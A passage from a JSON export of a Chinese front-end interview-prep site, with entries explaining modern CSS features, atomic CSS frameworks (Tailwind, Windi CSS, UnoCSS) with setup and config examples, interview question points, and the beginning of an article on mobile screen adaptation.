将来发展会怎么样，又会加入哪些新的特性，又或者会不会有新的模型代替它，我们拭目以待！谢谢！\n",
    "testPoint": "### 1. **CSS Variables（CSS 自定义属性）**\n   - **定义与应用**：什么是 CSS 变量？如何定义和使用 CSS 变量？\n   - **动态样式**：如何使用 CSS 变量实现动态主题切换？\n   - **嵌套与作用域**：CSS 变量如何在不同作用域中继承和覆盖？\n   - **优点**：与预处理器变量（如 SASS 变量）相比，CSS 变量有哪些优势？\n\n### 2. **CSS Grid 布局**\n   - **基础概念**：如何使用 CSS Grid 创建二维布局？与 Flexbox 有何不同？\n   - **常用属性**：`grid-template-rows`、`grid-template-columns`、`grid-gap` 等常见属性的作用是什么？\n   - **响应式设计**：如何使用 `grid-template-areas` 实现响应式布局？\n   - **实用技巧**：用 `grid` 实现复杂的布局，如网格系统、卡片排列等场景。\n\n### 3. **Subgrid**\n   - **作用**：什么是 `subgrid`？在什么场景下使用它？\n   - **子网格布局**：如何让子元素继承父网格的行或列定义，保持一致的网格排列？\n\n### 4. **CSS Container Queries（容器查询）**\n   - **定义与应用场景**：什么是容器查询？如何帮助实现更灵活的响应式布局？\n   - **语法与用法**：如何使用 `@container`、`container-type` 等属性来定义容器查询？\n   - **实际案例**：给出示例，如何实现根据容器宽度而非视口宽度调整布局的效果？\n\n### 5. **:has() 选择器**\n   - **定义与用途**：`:has()` 选择器的作用是什么？如何通过父元素选择包含某个子元素的元素？\n   - **动态样式**：如何利用 `:has()` 实现交互样式，如在父级有某子元素时改变其他元素的样式？\n   - **兼容性问题**：`:has()` 的支持情况如何？是否需要降级方案？\n\n### 6. **新的伪类和伪元素**\n   - **`:is()` 和 `:where()`**：这两个伪类的作用是什么？如何简化复杂选择器？\n   - **`:nth-child(An+B of S)`**：如何用 `nth-child` 新功能直接选择特定类型的元素？\n   - **::marker 和 ::part**：`::marker` 和 `::part` 伪元素的用途是什么？如何分别控制列表标记和 Web 组件的样式？\n\n### 7. **CSS 动画与过渡的改进**\n   - **@keyframes 动画改进**：如何结合 CSS 变量与 `@keyframes` 实现动态动画？\n   - **`scroll-timeline`**：如何创建基于滚动的动画？比如图片滚动到一定位置时才显示或变化。\n   - **更流畅的过渡效果**：使用 `animation-timing-function` 中的新值如 `ease-in-out-sine` 提升动画自然效果。\n\n### 8. **新媒体查询功能**\n   - **视口单位 vh、vw 的改进**：如何使用 `svh`、`lvh`、`dvh` 等视口单位解决移动端 100vh 的问题？\n   - **新环境媒体查询**：如何使用 `prefers-color-scheme` 检测系统的深色模式并应用适配样式？\n   - **交互模式检测**：如何利用 `hover`、`pointer` 检测设备的交互能力，并优化移动端的样式？\n\n### 9. **自适应字体尺寸（Clamp）**\n   - **`clamp()` 函数**：如何使用 `clamp()` 实现字体大小随视口变化而自适应？\n   - **优点**：相比于 `vw`、`vh`，`clamp()` 如何提供更细致的控制？如何在响应式布局中应用？\n\n### 10. **CSS 框架和工具的变化**\n   - **CSS in JS 的趋势**：如何评价 CSS-in-JS 的应用？它有哪些优缺点？\n   - **CSS 框架的革新**：Tailwind CSS、UnoCSS 等原子化 CSS 框架的优点？与传统框架如 Bootstrap 有何不同？\n\n### 11. **CSS 性能优化**\n   - **新的 `contain` 属性**：如何使用 `contain` 提升 CSS 渲染性能？\n   - **CSS `will-change`**：如何优化常用动画效果的性能？`will-change` 的正确使用方法是什么？\n\n### 12. **CSS Houdini**\n   - **定义与用途**：什么是 CSS Houdini？如何帮助开发者扩展 CSS 的功能？\n   - **自定义属性和绘制 API**：举例说明如何使用 Houdini 实现自定义样式或动画效果。\n   - **实际案例**：Houdini 在什么场景中提供了传统 CSS 无法实现的灵活效果？\n",
    "exerciseKeyList": "[]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 26,
    "createAt": "2024-11-09T03:16:16.000Z",
    "updateAt": "2024-11-10T05:42:12.000Z",
    "$progressExercise": "",
    "$exerciseList": []
  },
  "166": {
    "id": 166,
    "tagId": 11,
    "title": "原子化CSS",
    "explanation": "## 1. 什么是原子化CSS\n\n### 1.1 基本概念\n\n原子化CSS(Atomic CSS) 近年来热度逐渐增加，与原子化CSS相关的库在Github上也收获上万的Star。那么什么是原子化CSS呢，引用文章 [Let's Define Exactly What Atomic CSS is](https://css-tricks.com/lets-define-exactly-atomic-css/) 中定义：\"原子化CSS是一种CSS架构方式，其支持小型、单一用途的类，其名称基于视觉功能。\"\n\n更加通俗的来讲，原子化CSS是一种新的CSS编程思路，它倾向于创建小巧且单一用途的class，并且以视觉效果进行命名。举个简单的例子：\n\n```html\n\n<!-- 原子化类定义 -->\n\n<style>\n\n  .text-white { color: white; }\n\n  .bg-black { background-color: black; }\n\n  .text-center { text-align: center; }\n\n</style>\n\n<!-- 原子化类使用 -->\n\n<div class=\"text-white bg-black text-center\">hello Atomic CSS</div>\n\n```\n\n### 1.2 VS 行内样式\n\n看到以上的示例，你可能很快就想到，直接使用行内样式不是更好吗，还省去了原子类的定义。这个问题可以从样式编写、一致性、功能、和缓存四个方面来回答。\n\n在样式编写层面，CSS预处理和后处理器很大程度上依赖单独的样式表，原子化CSS可以充分利用Sass、Less等CSS预处理器功能进行样式的编写，同时可以借助`PostCSS`进一步增强CSS的功能。而对于行内样式，虽然在技术上支持使用预处理和后处理器对其进行处理，但很少有成熟的工具对此提供支持和维护。\n\n在一致性层面，原子化CSS框架一般有预定义的设计系统，开发者仅能在设计系统中选择要设置的值。而对于行内样式或者传统CSS类定义来说，可设置的值是没有任何限制的。对于行内样式或者传统的CSS类设置来说，一个标签的字体大小可能是`14px`或`0.875rem`，当产品（or 客户）说需要调小一点时，开发者A可能调整为`13px`，开发者B可能调整为`12px`。但对于原子化CSS框架来说，调小一点意味着设置的类从`text-sm`变为`text-xs`。\n\n> 以下为部分采用传统CSS类编写的网站样式统计数据（[统计来源](https://cssstats.com/stats/)）：\n>\n> * [掘金官网](https://juejin.cn/)：283种背景颜色 471种字体颜色 264种字体大小\n> * [GitLab](https://gitlab.com/gitlab-org/gitlab)：1199种背景颜色 1351种字体颜色 450种字体大小\n> * [CSDN](https://www.csdn.net/)：585种背景颜色 1190种字体颜色 504种字体大小\n\n在功能方面，原子化CSS本质上还是CSS类，因此支持媒体查询功能，也支持对元素的悬停、聚焦等状态进行处理，而内联样式缺少这部分的能力。\n\n在打包方面，内联样式包含在JS文件中，样式的修改会导致整个bundle的改变，原子化CSS样式定义和JS逻辑分离，修改元素的class属性可能并不影响（在没有新CSS类的情况下）最终打包输出样式文件。\n\n## 2. 谁在使用原子化CSS\n\n截至目前已经有部分网站借鉴或者使用原子化CSS的思想重构了自己的web网站，比较知名的网站有`Facebook`、`Twitter`、`Github`、`swipperjs`等。根据网上公开的信息，`Facebook`在使用原子化CSS思想重构之后，仅登录页面的`413KB`样式文件，减少为整个站点的`74KB`。\n\n* [Facebook](https://www.facebook.com/)\n\n![](https://static.ecool.fun//article/5ede6a1d-dc29-4e95-8b6c-d978bb2fa57f.png)\n\n* [Twitter](https://twitter.com/)\n\n![](https://static.ecool.fun//article/a4179f34-e870-404f-9815-3ad120e1faac.png)\n\n* [Github](https://github.com/)\n\n![](https://static.ecool.fun//article/dd786f60-a93e-4e5d-b770-3492ef306cd4.png)\n\n* [swiperjs](https://swiperjs.com/)\n\n![](https://static.ecool.fun//article/60b6c2ae-f28d-4128-a633-375279de025d.png)\n\n\n## 3. 流行的原子化CSS框架\n\n### 3.1 Tailwind CSS\n\n#### 3.1.1 简介\n\n[Tailwind CSS](https://tailwindcss.com/) 是一个功能优先的CSS框架，它继承了诸如flex、pt-4、text-center和rotate-90这样的类，它们能直接在脚本标记语言中组合起来，构建任何的设计。截止到目前该框架在[Github](https://github.com/tailwindlabs/tailwindcss)上拥有62.1k的Star，在[2021年最受欢迎的项目](https://risingstars.js.org/2021/zh)中位列第六。上文中提到的 [swipperjs](https://swiperjs.com/) 网站就是使用了该框架。\n\n#### 3.1.2 安装\n\n本文以`Create React App`创建的应用结合`Tailwind CSS`为例，更多安装可以查看[此链接](https://tailwindcss.com/docs/installation)。\n\n1. 创建项目\n\n```JavaScript\n\nnpx create-react-app tailwind-demo\n\ncd tailwind-demo\n\n```\n\n2. 安装`tailwindcss`相关依赖并初始化\n\n```JavaScript\n\nnpm install -D tailwindcss postcss autoprefixer\n\nnpx tailwindcss init -p\n```\n\n3. 在根目录新建`tailwind.config.js`文件，并添加以下配置\n\n```JavaScript\n\nmodule.exports = {\n  content: [\n    \"./src/**/*.{js,jsx,ts,tsx}\",\n  ],\n  theme: {\n    extend: {},\n  },\n  plugins: [],\n}\n```\n\n4. 在 `./src/index.css` 文件顶部添加如下代码\n\n```CSS\n\n@tailwind base;\n@tailwind components;\n@tailwind utilities;\n```\n\n5. 现在可以在组件中使用原子类\n\n```JavaScript\n\n// app.js\nfunction App() {\n  return (\n  <div className=\"w-screen h-screen flex items-center justify-center\">\n    <span className=\"text-3xl\">hello tailwindcss</span>\n  </div>\n  );\n}\n\nexport default App;\n```\n\n6. 建议安装`VS Code`插件`Tailwind CSS IntelliSense`，从而在编写代码时获得语法提示。\n\n#### 3.1.3 功能\n\n`Tailwind CSS`已经内置了较为完善的原子类和设计系统，可以直接在HTML中使用，这也是原子化CSS的核心功能。以下介绍该CSS框架的其它常见功能：\n\n* **悬停、焦点或者其他状态的处理。**`Tailwind CSS`包含几乎所有的伪类和伪元素修饰符，可以与工具类随意组合使用。\n\n```HTML\n\n<!-- \n  1. 输入框不可用时会显示浅灰的背景颜色\n  2. \"用户名称\"后会显示红色*号\n  3. 输入框聚焦时会显示不同颜色的边框\n  4. 可以修改placeholder的样式\n  5. 按钮悬浮时颜色变化 激活时透明度变化\n-->\n<form class=\"...\">\n  <div>\n    <label class=\"...\">用户编号</label>\n    <input\n      class=\"disabled:bg-gray-100 ...\"\n      disabled\n      value=\"1234\"\n    />\n  </div>\n  <div class=\"mt-4\">\n    <label class=\"block mb-2 after:content-['*'] after:text-red-600\">用户名称</label\n    >\n    <input\n      class=\"border-gray-300 focus:border-blue-300 placeholder:text-gray-300 ...\"\n      placeholder=\"请输入用户名称\"\n    />\n  </div>\n\n  <button class=\"bg-gray-100 hover:bg-blue-200 active:opacity-70 ...\">\n    点击保存\n  </button>\n</form>\n\n<!-- 6. 偶数行背景使用浅灰色，第一行使用蓝色字体，最后一行使用红色字体 -->\n<ul class=\"...\">\n  <li class=\"even:bg-gray-50 first:text-blue-600 last:text-red-600 ...\">\n    111111\n  </li>\n  <li class=\"even:bg-gray-50 first:text-blue-600 last:text-red-600 ...\">\n    222222\n  </li>\n  <li class=\"even:bg-gray-50 first:text-blue-600 last:text-red-600 ...\">\n    333333\n  </li>\n  <li class=\"even:bg-gray-50 first:text-blue-600 last:text-red-600 ...\">\n    444444\n  </li>\n</ul>\n\n<!-- 7. 首字母变大，首行加粗 -->\n<p class=\"first-letter:text-4xl first-line:font-bold ...\">\n  Hello Tailwind Hello Tailwind Hello Tailwind Hello Tailwind Hello\n  Tailwind Hello Tailwind Hello Tailwind Hello Tailwind\n</p>\n```\n\n* **响应式设计。** `Tailwind CSS`按照屏幕的宽度默认提供了5个断点：`sm(<=640px)`、`md(<=768px)`、`lg(<=1024px)`、`xl(<=1280px)`、`2xl(1536px)`。`Tailwind CSS`中的每个原子类都可以有条件的应用于不同的断点，从而快速的构建复杂的响应式界面。\n\n```HTML\n<!-- 在小屏设备使用大圆角，在大屏设备使用小圆角 -->\n<div class=\"rounded-2xl lg:rounded-md ...\"></div>\n```\n\n* **深色模式。**\n\n```HTML\n<!-- 正常模式下背景白色，深色模式下，背景黑色 -->\n<div class=\"bg-white dark:bg-black ...\"></div>\n```\n\n* **自定义主题。** `Tailwind CSS`内置了默认主题来帮助开发者快速的入门，但该框架支持并鼓励开发者自定义主题来构建自己的设计系统。通过修改根目录下的`tailwind.config.js`文件，开发者可以自定义项目的屏幕断点、调色板、间距、边框圆角等属性。\n\n```JavaScript\n\nmodule.exports = {\n  content: [\n    \"./src/**/*.{js,jsx,ts,tsx}\",\n  ],\n  theme: {\n    // 自定义屏幕断点\n    screens: {\n      'sm': '480px',\n      'md': '768px',\n      'lg': '976px',\n      'xl': '1440px',\n      '2xl': '1860px'\n    },\n    // 自定义调色板，设置之后覆盖默认调色板，可以在背景、字体、边框颜色设置中使用。\n    // 原有如bg-blue-50、text-gray-50等值不可用\n    colors: {\n      'transparent': 'transparent',\n      'black': '#000',\n      'white': '#fff',\n      'gray': {\n        100: '#f7fafc',\n        900: '#1a202c',\n      },\n    },\n    // 自定义边界圆弧，设置之后覆盖默认边界圆弧。\n    borderRadius: {\n      DEFAULT: '12px', // 默认值，使用rounded即可\n      'none': '0',\n      'sm': '4px',\n    },\n    // 扩展Tailwind CSS内置主题\n    extend: {\n      // 扩展屏幕断点的值，增加3xl大小屏幕，可以使用3xl:xxx的写法。\n      screens: {\n        '3xl': '2560px'\n      },\n      // 扩展间距的值，增加128和144的大小，可以使用p-128、m-128的写法。\n      // 默认情况下，该设置将影响padding、margin、width、height、maxHeight、flex-basis等值的设置。\n      spacing: {\n        '128': '32rem',\n        '144': '36rem',\n      },\n    }\n  },\n  plugins: [],\n}\n```\n\n* **其它。**\n\n```HTML\n<!-- 使用任意值 -->\n<div class=\"pt-[26px] lg:pt-[36px] color-[#eee]\"></div>\n<div class=\"bg-[url('/assets/mi.svg')]\"></div>\n\n<!-- !前缀提高属性优先级  -->\n<div class=\"!pt-1\"></div>\n<button class=\"btn-primary\">\n  Save changes\n</button>\n\n/* @apply 抽取公共样式，应尽量避免使用，需要起类名并且会导致CSS生产包变大 */\n.btn-primary {\n    @apply py-2 px-4 bg-blue-500;\n}\n```\n\n### 3.2 Windi CSS\n\n#### 3.2.1 简介\n\n[Windi](https://windicss.org/) 号称下一代功能优先的CSS框架。可以把`Windi CSS`看作是按需供应的`Tailwind`替代方案，它的出现是为了解决`Tailwind v2.0`随着项目变大初始化编译和热更新慢的问题。\n\n`Windi CSS`完美兼容`Tailwind v2.0`并且拥有很多额外的炫酷功能。\n\n该框架在[Github](https://github.com/windicss/windicss)上拥有5.8k的Star。\n\n但需要注意的是，`Tailwind v3` 版本默认开启了即时引擎（JIT），实现了和Windi类似的按需加载的功能，构建速度得到了极大的提升。可能也是因为这个原因，截止目前Windi的Github仓库已经半年没有提交过代码。\n\n#### 3.2.2 安装\n\n本文以`Create React App`创建的应用集成`Windi CSS`为例，更多安装可以查看[此链接](https://cn.windicss.org/guide/installation.html)。\n\n1. 创建项目\n\n```Bash\nnpx create-react-app windi-demo\ncd windi-demo\n```\n\n2. 安装webpack扩展工具和插件\n\n```Bash\nnpm i react-app-rewired windicss-webpack-plugin\n```\n\n3. 在根目录新建`config-overrides.js`，引用`windi`插件。该步骤本质是配置`windicss-webpack-plugin`插件，其它方式扩展`cra`的`webpack`配置也可以。\n\n```JavaScript\n\nconst WindiCSSWebpackPlugin = require(\"windicss-webpack-plugin\");\n\nmodule.exports = function override(config) {\n  config.plugins.push(new WindiCSSWebpackPlugin({ virtualModulePath: \"src\" }));\n  return config;\n};\n```\n\n4. 修改`package.json`中的`scripts`命令\n\n```JSON\n\"scripts\": {\n  \"start\": \"react-app-rewired start\",\n  \"build\": \"react-app-rewired build\",\n  \"test\": \"react-app-rewired test\",\n  \"eject\": \"react-app-rewired eject\"\n}\n```\n\n5. 在根目录新建`windi.config.js`文件，添加如下配置\n\n```JavaScript\n\nimport { defineConfig } from 'windicss/helpers'\n\nexport default defineConfig({\n  extract: {\n    include: ['**/*.{jsx,js,css,html}'],\n    exclude: ['node_modules', '.git'],\n  },\n})\n```\n\n6. 在`index.js`中引入`windi.css`\n\n```JavaScript\nimport './windi.css' // 如果报错可以尝试 import './virtual:windi.css'\n```\n\n7. 现在可以在组件中使用原子类\n\n```JavaScript\n\n// app.js\nfunction App() {\n  return (\n  <div className=\"w-screen h-screen flex items-center justify-center\">\n    <span className=\"text-3xl\">hello windicss</span>\n  </div>\n  );\n}\nexport default App;\n```\n\n### 3.2.3 功能\n\n`Windi CSS`完美兼容`Tailwind v2.0`，包含了其所有的工具类和几乎所有的功能。同时还新增了许多额外的特性。\n\n* **自动值推导。** 和`Tailwind`的任意值功能类似，不过其书写更加的方便。\n\n```HTML\n<!-- 可以不用加中括号 -->\n<div class=\"text-20px text-hex-1e1e1e\">自动值推导</div>\n```\n\n* **修饰组。**\n\n```HTML\n<!-- hover之后，字体颜色加深并且字体加粗 -->\n<div className=\"text-blue-700 hover:(text-blue-900 font-bold)\">修饰组</div>\n```\n\n* **属性化模式。** 基于这个特性，可以像在`html`属性中编写`windi`类。\n\n```HTML\n<!-- 修改windi.config.js文件，添加attributify: true配置 -->\n<button \n  bg=\"blue-400 hover:blue-500 dark:blue-500 dark:hover:blue-600\"\n  text=\"sm white\"\n  font=\"light\"\n  p=\"y-2 x-4\"\n  border=\"2 rounded blue-200\"\n  >\n  Button\n</button>\n\n<!-- 为了避免属性冲突，也可以自定义前缀，修改attributify属性值为{ prefix: 'mi-' } -->\n<button \n  mi-bg=\"blue-400 hover:blue-500 dark:blue-500 dark:hover:blue-600\"\n  mi-text=\"sm white\"\n  mi-font=\"light\"\n  mi-p=\"y-2 x-4\"\n  mi-border=\"2 rounded blue-200\"\n>\n  Button\n</button>\n```\n\n* **可视化分析器。** 在项目根目录下执行npx windicss-analysis可以生成项目的分析报告。\n\n### 3.3 UnoCSS\n\n#### 3.3.1 简介\n\n[UnoCSS](https://uno.antfu.me/) 是具有高性能且极具灵活性的即时原子化CSS引擎。它是一个引擎而非框架，因为它并没有提供核心工具类，所有功能可以通过预设和内联配置提供。`UnoCSS`的主要目标是直观性和可定制性，它可以开发者在极短时间内定义自己的CSS工具类。尽管`UnoCSS`目前还处于beta阶段，但其在 [Github](https://github.com/unocss/unocss) 上的 `Star`数已经达到 **7.5k**。\n\n3.3.2 安装\n\n由于UnoCSS对于Vite有更好的支持，本文将以Vite初始化React项目并集成UnoCSS为例，更多安装可以查看[此链接](https://github.com/unocss/unocss)。\n\n1. 创建项目 \n\n```Bash\nnpm create vite@latest unocss-demo -- --template react\ncd unocss-demo\nnpm i   \n```\n\n2. 安装UnoCSS插件\n\n```Bash\nnpm i unocss\n```\n\n3. 在`vite.config.js`中引用插件\n\n```Bash\nimport { defineConfig } from \"vite\";\nimport react from \"@vitejs/plugin-react\";\nimport Unocss from \"unocss/vite\";\n\nexport default defineConfig({\n  plugins: [\n    react(),\n    Unocss({\n      plugins: [],\n    }),\n  ],\n});\n```\n\n4. 在`src/main.jsx`中添加如下引用\n\n```Bash\nimport 'uno.css'\n```\n\n5. 现在可以在组件中使用原子类\n\n```Bash\n// app.js\nfunction App() {\n  return (\n  <div className=\"w-screen h-screen flex items-center justify-center\">\n    <span className=\"text-3xl\">hello tailwindcss</span>\n  </div>\n  );\n}\n\nexport default App;\n```\n\n#### 3.3.3 功能\n\n在了解该框架功能之前，建议读者先阅读文章[重新构想原子化 CSS](https://antfu.me/posts/reimagine-atomic-css-zh)，了解作者对原子化CSS的认识和编写该框架的心路历程。\n\n`UnoCSS`本身不具有原子类和设计系统，所有的功能都是通过预设来实现。其默认的预设包含了上述两种框架的原子类和设计系统，因此在使用方面的功能与上述两种框架类似。其主要特点是可以快速的构建自己的原子类和设计系统。由于笔者没有深入的体验该框架，因此仅作简单介绍，更多的规则预设可以查看[官方文档](https://github.com/unocss/unocss)。\n\n```JavaScript\n// vite.config.js\nexport default defineConfig({\n  plugins: [\n    react(),\n    Unocss({\n      rules: [\n        // m-1 => margin: 1px; m-100 => margin: 100px\n        [/^m-(\\d+)$/, ([, d]) => ({ margin: `${d}px` })],\n        // p-1 => padding: 1px; m-100 => padding: 100px\n        [/^p-(\\d+)$/, match => ({ padding: `${match[1]}px` })],\n      ],\n    }),\n  ],\n});\n```\n\n## 总结\n\n### 4.1 问题及思考\n\n如何实现按页面分包？在使用原子化CSS框架之后，整个项目的CSS并不会很大，即便是Facebook重构完成后，也只需要70kb，因此分包意义不大。\n\nJSX中大量的类名增加了JS文件的体积？相比于自定义CSS类名，使用原子化CSS类名确实会让class字符串变长，但由于都是重复的字符串，在经过GZip后影响微乎其微。\n\n多主题切换是否支持？借助CSS变量和CSS原子化框架提供的主题配置，可以实现多主题的切换。详细实现思路可以参考文章[使用 Tailwind 实现网页多主题](https://juejin.cn/post/7053802767348924430)。\n\n浏览器兼容性？以上三种框架中的大部分功能都适用于所有现代浏览器，仅有部分未被所有浏览器支持的前沿功能的API存在兼容性问题，例如:`focus-visible`伪类和`backdrop-filter`。\n\n自定义样式破坏约束？以上三种框架都支持自定义样式，这一定程度上破坏了约束，但确极大的提高了框架的实用性，因此得到了各个框架的支持。\n\n### 4.2 使用感受\n\n为了深度的体验原子化CSS框架，我使用windi框架重构了个人的博客项目，包括展示页面（Next.js）和后台管理系统（vue3），整体的开发体验十分的良好。对于不需要再起类名这一点真的很香。而且由于基本不需要自己写CSS类，几乎所有的样式文件都可以删除，项目干净了很多。\n\n另外也有两点不太习惯，一是windi的设计系统的字体大小、行高、边距都是以rem为单位，而原项目中一般都是以px为单位。二是定位问题时，即便在网页上找到了问题节点，也无法通过类名直接在项目中全局搜索。\n\n### 4.3 优缺点及适用场景\n\n深度体验之后，个人觉得原子化CSS主要优势有：\n\n* 不用浪费精力起类名；\n* CSS文件将不会无限增长，相比于以往的方式CSS打包结果更小；\n* 可以很好的避免历史样式的堆积，不存在历史样式类不敢删除的问题；\n* 天然的支持组件间的样式隔离，没有自定义的class也就无需担心组件之间样式的影响。\n\n其主要缺点有：\n* 前期有一定的学习成本，需要不断的翻看样式对应的类名；\n* 无法通过类名在项目中直接定位源码位置；\n* 类名横向平铺无法快速定位要修改的内容。\n\n基于以上原子化CSS的优缺点，个人觉得原子化CSS的适用场景有：\n\n* 个人项目，对样式没有太高的要求，借助设计系统，可以提升页面显示效果，毕竟不用起类名真的很香。\n\n* 大型项目，有较为完整且稳定的视觉规范，能够很好的搭建设计系统。可以很好的解决历史样式的堆积问题并且有效的减少CSS的体积。\n",
    "testPoint": "### 1. **原子化 CSS 的基本概念**\n   - 什么是原子化 CSS？如何理解“原子”类？\n   - 与传统 CSS 编写方式（例如 BEM、OOCSS）相比，原子化 CSS 有哪些不同之处？\n\n### 2. **原子化 CSS 的优点**\n   - **高复用性**：为什么说原子化 CSS 提高了样式的复用性？如何通过多个原子类组合来实现复杂样式？\n   - **样式冲突减少**：为什么原子化 CSS 能减少或避免样式冲突？（例如：避免全局样式覆盖的问题）\n   - **降低 CSS 文件体积**：在生产环境中，原子化 CSS 框架如何通过“按需生成”减少 CSS 文件体积？\n\n### 3. **原子化 CSS 的缺点和挑战**\n   - **可读性问题**：原子化 CSS 的类名较多，如何解决冗长的类名带来的代码可读性问题？\n   - **维护成本**：在大型项目中如何使用原子化 CSS，保证样式一致性和可维护性？\n   - **语义化**：原子化 CSS 如何处理样式的语义性问题？类名如 `p-4` 或 `text-center` 缺少描述性，如何解决？\n\n### 4. **Tailwind CSS 的用法**\n   - **核心概念**：如何使用 Tailwind CSS 定义间距、颜色、字体等？例如，`p-4` 代表什么？\n   - **实用工具类**：举例说明如何用 Tailwind CSS 快速实现响应式布局？\n   - **扩展与定制**：如何在 Tailwind CSS 中自定义配色、间距等，使其符合项目设计需求？\n   - **JIT 模式**：什么是 Tailwind CSS 的即时模式（JIT），它如何优化原子化 CSS 的性能？\n\n### 5. **UnoCSS 与按需生成**\n   - **按需生成**：UnoCSS 是如何通过按需生成的方式只生成页面需要的类？\n   - **自定义规则**：在 UnoCSS 中如何创建自定义原子类？例如实现一个特定的边距或字体样式。\n   - **性能优化**：UnoCSS 如何避免多余 CSS 的加载？它与 Tailwind 的 JIT 模式有何异同？\n\n### 6. **设计系统与原子化 CSS 的结合**\n   - **统一样式规范**：在使用原子化 CSS 时，如何定义设计系统中的配色、字体和间距？\n   - **响应式设计**：如何用原子化 CSS 类快速实现响应式设计？\n   - **组件化**：原子化 CSS 如何和 React/Vue 等前端框架结合？如何在组件中封装原子化 CSS 类？\n\n### 7. **实用场景与代码示例**\n   - **常见布局**：如何用原子化 CSS 快速实现常见布局，如两栏布局、网格布局等？\n   - **状态管理**：如何在 Tailwind CSS 中处理不同的状态？例如 `hover:`、`focus:`、`active:` 等。\n   - **实战**：给出一段 HTML，要求面试者使用原子化 CSS 框架的类名实现设计效果。\n\n### 8. **CSS 变量与原子化 CSS**\n   - **自定义属性**：如何在原子化 CSS 中使用 CSS 变量？如何在 Tailwind 或 UnoCSS 中实现主题切换？\n   - **混合使用**：在复杂项目中如何将原子化 CSS 与自定义 CSS 样式结合，保证灵活性和可维护性？\n\n### 9. **原子化 CSS 的性能优化**\n   - **打包优化**：如何配置原子化 CSS 框架，避免打包生成大量无用样式？\n   - **动态样式加载**：在单页应用中，如何确保只加载当前页面所需的样式？\n\n### 10. **适用场景与限制**\n   - **适用项目类型**：原子化 CSS 更适合哪些类型的项目？例如快速开发、小型项目等。\n   - **局限性**：在极其复杂的项目中，原子化 CSS 是否有局限？需要注意哪些维护问题？\n",
    "exerciseKeyList": "[\"a8b24897-3f40-480f-a46b-2af8d6a07305\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 23,
    "createAt": "2024-11-09T03:18:51.000Z",
    "updateAt": "2024-11-10T05:42:12.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a8b24897-3f40-480f-a46b-2af8d6a07305",
        "title": "说说你对原子化 CSS 的了解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-11-09T03:20:28.000Z",
        "updateAt": "2024-11-09T03:20:31.000Z"
      }
    ]
  },
  "167": {
    "id": 167,
    "tagId": 11,
    "title": "移动端适配",
    "explanation": "## 导读\n\n移动端适配，是我们在开发中经常会遇到的，这里面可能会遇到非常多的问题：\n\n* `1px`问题\n* `UI`图完美适配方案\n* `iPhoneX`适配方案\n* 横屏适配\n* 高清屏图片模糊问题\n* ...\n\n上面这些问题可能我们在开发中已经知道如何解决，但是问题产生的原理，以及解决方案的原理可能会模糊不清。在解决这些问题的过程中，我们往往会遇到非常多的概念：像素、分辨率、`PPI`、`DPI`、`DP`、`DIP`、`DPR`、视口等等，你真的能分清这些概念的意义吗？\n\n本文将从移动端适配的基础概念出发，探究移动端适配各种问题的解决方案和实现原理。\n\n## 一、英寸\n\n一般用英寸描述屏幕的物理大小，如电脑显示器的`17`、`22`，手机显示器的`4.8`、`5.7`等使用的单位都是英寸。\n\n需要注意，上面的尺寸都是屏幕对角线的长度：\n\n![](https://static.ecool.fun//article/f9d280c2-cdd9-4abe-a4a2-2719622c1c1b.png)\n\n\n英寸(`inch`,缩写为`in`)在荷兰语中的本意是大拇指，一英寸就是指甲底部普通人拇指的宽度。\n\n英寸和厘米的换算：`1英寸 = 2.54 厘米`\n\n## 二、分辨率\n\n### 2.1 像素\n\n像素即一个小方块，它具有特定的位置和颜色。\n\n图片、电子屏幕（手机、电脑）就是由无数个具有特定颜色和特定位置的小方块拼接而成。\n\n像素可以作为图片或电子屏幕的最小组成单位。\n\n下面我们使用`sketch`打开一张图片：\n\n![](https://static.ecool.fun//article/986bf27a-ab54-43d6-be4c-7214f55b74c9.png)\n\n将这些图片放大即可看到这些像素点：\n\n![](https://static.ecool.fun//article/e21f0d39-8e02-4360-b67e-4761724d079f.png)\n\n通常我们所说的分辨率有两种，屏幕分辨率和图像分辨率。\n\n### 2.2 屏幕分辨率\n\n屏幕分辨率指一个屏幕具体由多少个像素点组成。\n\n下面是`apple`的官网上对手机分辨率的描述：\n\n![](https://static.ecool.fun//article/2a1bec4c-9156-4913-9773-205eb9f06e09.png)\n\n`iPhone XS Max` 和 `iPhone SE`的分辨率分别为`2688 x 1242`和`1136 x 640`。这表示手机分别在垂直和水平上所具有的像素点数。\n\n当然分辨率高不代表屏幕就清晰，屏幕的清晰程度还与尺寸有关。\n\n### 2.3 图像分辨率\n\n我们通常说的`图片分辨率`其实是指图片含有的`像素数`，比如一张图片的分辨率为`800 x 400`。这表示图片分别在垂直和水平上所具有的像素点数为`800`和`400`。\n\n同一尺寸的图片，分辨率越高，图片越清晰。\n\n![](https://static.ecool.fun//article/4acc55e6-5f62-4a1b-bc51-648e6d6dc19a.png)\n\n### 2.4 PPI\n\n`PPI(Pixel Per Inch)`：每英寸包括的像素数。\n\n`PPI`可以用于描述屏幕的清晰度以及一张图片的质量。\n\n使用`PPI`描述图片时，`PPI`越高，图片质量越高，使用`PPI`描述屏幕时，`PPI`越高，屏幕越清晰。\n\n在上面描述手机分辨率的图片中，我们可以看到：`iPhone XS Max` 和 `iPhone SE`的`PPI`分别为`458`和`326`，这足以证明前者的屏幕更清晰。\n\n由于手机尺寸为手机对角线的长度，我们通常使用如下的方法计算`PPI`:\n\n![](https://static.ecool.fun//article/0ca8568c-330d-4736-beb5-14ec0960e36f.png)\n\n\n`iPhone 6`的`PPI`为\n\n\n![](https://static.ecool.fun//article/9533cd66-c1cd-4ce9-ad92-245ae21ff3e0.png)\n\n\n那它每英寸约含有`326`个物理像素点。\n\n### 2.5 DPI\n\n`DPI(Dot Per 